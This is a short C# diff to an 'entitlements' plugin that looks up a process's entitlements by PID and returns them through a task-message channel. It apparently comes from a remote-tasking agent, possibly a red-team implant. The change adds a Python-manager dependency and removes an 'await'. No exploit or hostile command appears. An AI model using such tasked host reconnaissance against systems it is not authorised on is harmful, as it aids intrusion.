@@ -10,7 +10,7 @@ namespace Agent
     {
         public string Name => "entitlements";
         private IMessageManager messageManager { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
         }
@@ -19,7 +19,7 @@ namespace Agent
         {
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
             int pid = int.Parse(args["pid"]);
-            await this.messageManager.WriteLine(GetProcessEntitlements(pid), job.task.id, true);
+            this.messageManager.WriteLine(GetProcessEntitlements(pid), job.task.id, true);
         }
         string GetProcessEntitlements(int pid)
         {
